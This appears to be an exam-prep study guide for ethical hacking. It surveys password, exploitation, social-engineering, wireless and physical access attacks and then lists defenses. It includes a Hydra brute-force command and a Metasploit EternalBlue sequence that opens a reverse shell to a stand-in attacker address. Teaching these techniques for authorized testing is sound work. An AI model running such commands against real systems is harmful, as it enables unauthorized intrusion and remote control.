# Gaining Access Techniques

## Introduction to Gaining Access

Gaining access is the critical third phase in the ethical hacking methodology, following Footprinting and Enumeration. This phase involves actively attempting to penetrate a target system using vulnerabilities discovered during previous phases. The objective is to obtain unauthorized access to systems, applications, or networks, which ethical hackers perform to identify security weaknesses before malicious actors can exploit them.

This phase transforms theoretical reconnaissance data into practical access. Success here demonstrates a real-world security failure that organizations must address. Ethical hackers must operate within their authorized scope during this phase, as these techniques can cause system disruption if performed carelessly.

## Password Attacks

### Understanding Password Authentication

Password-based authentication remains the most common access control mechanism. Systems typically store passwords as cryptographic hashes rather than plain text. When a user enters a password, the system hashes it and compares it to the stored hash.

```
+-------------------+     +-----------------+     +-------------------+
| User enters       |     | System          |     | Comparison        |
| password:         | --> | hashes input    | --> | with stored hash  |
| "MyPassword123"   |     | using algorithm |     | for authentication|
+-------------------+     +-----------------+     +-------------------+
```

### Types of Password Attacks

**1. Dictionary Attacks**
Dictionary attacks use a predefined list of words (a "dictionary") commonly used as passwords. The attack systematically tries each word in the list against the authentication mechanism.

**2. Brute Force Attacks**
Brute force attacks systematically try every possible combination of characters until the correct password is found. While guaranteed to eventually succeed, these attacks can be extremely time-consuming.

**3. Hybrid Attacks**
Hybrid attacks combine dictionary and brute force methods. They start with dictionary words but then append numbers, symbols, or modify cases (e.g., "password" becomes "Password1!").

**4. Rainbow Table Attacks**
Rainbow tables are precomputed tables of password hashes and their corresponding plaintext values. Attackers compare captured password hashes against these tables to find matches.

**5. Password Spraying**
Password spraying uses a small number of common passwords against many usernames rather than many passwords against a single account. This technique avoids account lockout policies.

### Tools for Password Attacks

| Tool Name       | Primary Use            | Attack Type     | Platform       |
| --------------- | ---------------------- | --------------- | -------------- |
| John the Ripper | Password cracking      | Multiple        | Cross-platform |
| Hashcat         | Password recovery      | GPU-accelerated | Cross-platform |
| Hydra           | Network login cracker  | Online attacks  | Cross-platform |
| Medusa          | Network login cracker  | Online attacks  | Cross-platform |
| Ophcrack        | Rainbow table cracking | Rainbow tables  | Windows        |

Example command for Hydra:

```
hydra -l username -P password_list.txt ftp://target_ip
```

## Vulnerability Exploitation

### Understanding Vulnerabilities

A vulnerability is a weakness in a system's design, implementation, or operation that could be exploited to violate the system's security policy. Vulnerabilities can exist in operating systems, applications, network protocols, or configurations.

### The Vulnerability Exploitation Process

```
+---------------------+     +---------------------+     +---------------------+
| Identify            |     | Research and        |     | Develop or          |
| vulnerability       | --> | select appropriate  | --> | select exploit      |
| through enumeration |     | exploit             |     | code                |
+---------------------+     +---------------------+     +---------------------+
        |                                                         |
        v                                                         v
+---------------------+     +---------------------+     +---------------------+
| Test exploit in     |     | Execute exploit     |     | Verify successful   |
| controlled environment | --> | against target      | --> | access gained       |
+---------------------+     +---------------------+     +---------------------+
```

### Types of Exploits

**1. Buffer Overflows**
Buffer overflow occurs when a program writes more data to a buffer than it can hold, overwriting adjacent memory. This can allow attackers to execute arbitrary code.

**2. SQL Injection**
SQL injection exploits vulnerabilities in database-driven applications where user input isn't properly sanitized, allowing attackers to execute malicious SQL commands.

**3. Cross-Site Scripting (XSS)**
XSS vulnerabilities enable attackers to inject client-side scripts into web pages viewed by other users, potentially stealing session cookies or other sensitive data.

**4. Remote Code Execution (RCE)**
RCE vulnerabilities allow attackers to execute arbitrary commands on a target system remotely, often providing immediate system access.

**5. Privilege Escalation Exploits**
These exploits take advantage of flaws that allow users to gain higher privileges than originally intended.

### Exploitation Frameworks

**Metasploit Framework**
Metasploit is the most widely used penetration testing framework, providing tools to develop, test, and execute exploits.

Key components:

- **msfconsole**: Main interface for Metasploit
- **Exploits**: Code that uses vulnerabilities
- **Payloads**: Code that runs after successful exploitation
- **Auxiliary modules**: Scanning, fuzzing, and other supporting tools
- **Post-exploitation modules**: Activities after gaining access

Example Metasploit workflow:

```
msf6 > search eternalblue
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS target_ip
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST attacker_ip
msf6 > exploit
```

## Social Engineering Attacks

### Principles of Social Engineering

Social engineering manipulates human psychology rather than technical vulnerabilities. These attacks exploit natural human tendencies such as trust, authority, fear, and greed.

### Technical Social Engineering Methods

**1. Phishing**
Phishing uses deceptive emails, text messages, or websites to trick users into revealing sensitive information or downloading malware.

**2. Spear Phishing**
Spear phishing targets specific individuals or organizations with personalized messages that appear legitimate.

**3. Watering Hole Attacks**
Attackers compromise websites frequently visited by their targets, injecting malicious code to exploit visitors' systems.

**4. Pretexting**
Attackers create fabricated scenarios (pretexts) to persuade victims to provide information or access.

**5. Baiting**
Baiting offers something enticing to victims (e.g., free software) in exchange for compromising their system.

### Technical Implementation

Social engineering often has technical components:

- Fake login pages that capture credentials
- Malicious attachments containing exploit code
- USB drops with auto-executing malware
- Compromised websites with drive-by downloads

## Wireless Attacks

### Wireless Network Vulnerabilities

Wireless networks introduce additional attack vectors due to their broadcast nature and historical security weaknesses.

### Common Wireless Attacks

**1. Evil Twin Attacks**
Attackers set up rogue access points with legitimate-sounding names to trick users into connecting.

**2. WEP/WPA Cracking**
Weak encryption protocols like WEP can be cracked relatively easily, while WPA/WPA2 attacks require capturing the handshake and brute-forcing.

**3. KRACK Attacks**
Key Reinstallation Attacks exploit vulnerabilities in the WPA2 protocol's four-way handshake.

**4. Wireless Packet Sniffing**
Attackers capture wireless traffic to extract sensitive information like passwords or session cookies.

### Tools for Wireless Attacks

- **Aircrack-ng**: Suite of tools for wireless auditing
- **Kismet**: Wireless network detector, sniffer, and intrusion detection system
- **Wifite**: Automated wireless auditing tool
- **Reaver**: Implementation of the WPS Pixie Dust attack

## Physical Access Attacks

### The Threat of Physical Access

Physical access to a system often negates many cybersecurity protections. As the saying goes: "If an attacker has physical access to your computer, it's not your computer anymore."

### Physical Access Techniques

**1. Live Boot Attacks**
Using bootable media (USB, CD) with tools like Kali Linux to bypass operating system security.

**2. Cold Boot Attacks**
Exploiting the data remanence property of DRAM to recover encryption keys after rapid cooling.

**3. Hardware Keyloggers**
Physical devices inserted between keyboard and computer to capture keystrokes.

**4. BIOS/UEFI Attacks**
Modifying firmware to install persistent malware that survives operating system reinstallation.

## Defense Strategies

### Protecting Against Password Attacks

- Implement strong password policies (length, complexity, expiration)
- Use multi-factor authentication
- Enforce account lockout policies after failed attempts
- Monitor for brute force attempts
- Use salted password hashes to defeat rainbow tables

### Mitigating Vulnerability Exploitation

- Regular vulnerability scanning and patching
- Network segmentation to limit lateral movement
- Application whitelisting
- Least privilege principle for user accounts
- Intrusion detection/prevention systems

### Countering Social Engineering

- Security awareness training for employees
- Email filtering and anti-phishing solutions
- Strict access control policies
- Verification procedures for sensitive requests

### Securing Wireless Networks

- Use WPA3 encryption where available
- Disable WPS functionality
- Implement strong passphrases
- Hide SSID (though this provides limited protection)
- MAC address filtering (as an additional layer)

### Preventing Physical Attacks

- Physical security controls (locks, access cards, surveillance)
- BIOS/UEFI passwords
- Disk encryption
- Disabling external boot devices in BIOS settings
- Port security (disabling unused USB ports)

## Exam Tips

1. **Understand Attack Mechanics**: For each attack type, know not just the name but how it works technically.
2. **Tool Familiarity**: Be able to identify which tools are used for specific attack types.
3. **Defense Correspondence**: For every attack technique, know the appropriate defensive measures.
4. **Scenario Analysis**: Exam questions often present scenarios where you must identify the attack type based on described activities.
5. **Ethical Considerations**: Remember that these techniques should only be used within authorized testing scope with proper documentation.
6. **Process Order**: Understand where gaining access fits in the overall hacking methodology (after footprinting and enumeration, before privilege escalation).
